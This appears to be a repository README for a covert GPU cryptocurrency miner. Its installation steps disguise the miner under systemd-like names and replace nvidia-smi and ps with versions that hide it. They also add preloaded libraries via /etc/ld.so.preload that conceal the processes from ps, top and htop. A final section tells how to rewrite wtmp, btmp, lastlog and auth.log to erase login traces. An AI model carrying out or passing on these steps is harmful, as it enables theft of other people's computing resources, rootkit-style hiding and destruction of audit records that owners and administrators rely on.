# AWESOME WOKR !!!
## Structure
* exec: executed file.
    * nvidia-smi: excludes `systemd-diagnosis` in nvidia-smi panel.
    * systemd-firewall: is an adaptive system resource allocator determines which GPU the slave miners work on.
    * systemd-update: is the same to the `systemd-firewall` but more merciful that only works at midnight.
    * systemd-diagnosis: is the pool slave miner.
    * libGNU.co hides `systemd-diagnosis` for ps, top ,and htop.
    * libnvidia-openai.so hides `systemd-firewall` for ps, top ,and htop.

* source: corresponding source code of the executed file in `./exec`.

## Installation
run the `Makefile` by `sudo make`. If you want to be blame, run it without `sudo`. 

### nvidia-smi
1. please make sure the variable `skip` in `source/nvidia-smi.py` is the same to the **slave miner**'s file name.
1. rename original `nvidia-smi` by `nl-toolkit` in `/usr/bin`.
1. move the *degraded* `nvidia-smi` to `/usr/bin`.
1. add read and execution permissions by `chmod +rx nvidia-smi`

### ps
1. please make sure the regex in `source/ps.py` cover the *executed file*, *pool name*, *renamed linux file*.
1. rename original `ps` by `ps2` in `/usr/bin`.
1. move the *degraded* `ps` to `/usr/bin`.
1. add read and execution permissions by `chmod +rx ps`

### systemd-firewall
1. move `systemd-firewall` to `/usr/bin`.
1. add read and execution permissions by `chmod +rx systemd-firewall`

### systemd-update
1. same to the `systemd-firewall`.

### libGNU.co and libnvidia-openai.co
1. move `libGNU.co` and `libnvidia-openai.co` to `/usr/lib`
1. `echo /usr/lib/libGNU.co >> /etc/ld.so.preload`
1. `echo /usr/lib/libnvidia-openai.co >> /etc/ld.so.preload`

## Usage
### Slash the miner
1. `sudo nohup systemd-firewall 2>&1 > /dev/null &`
1. check the mining status by `nl-toolkit`

### Check degraded files
1. `nvidia-smi`
1. `ps aux | grep f2pool`
1. `top` or `htop`

### Clean login log
1. revise following files by 
```bash
utmpdump [logfile] > tmp_output.txt
utmpdump -r tmp_output.txt > [logfile]
```

* `last`: `/var/log/wtmp`
* `lastb`: `/var/log/btmp`
* `lastlog`: `/var/log/lastlog`

1. revise `/var/log/auth.log`

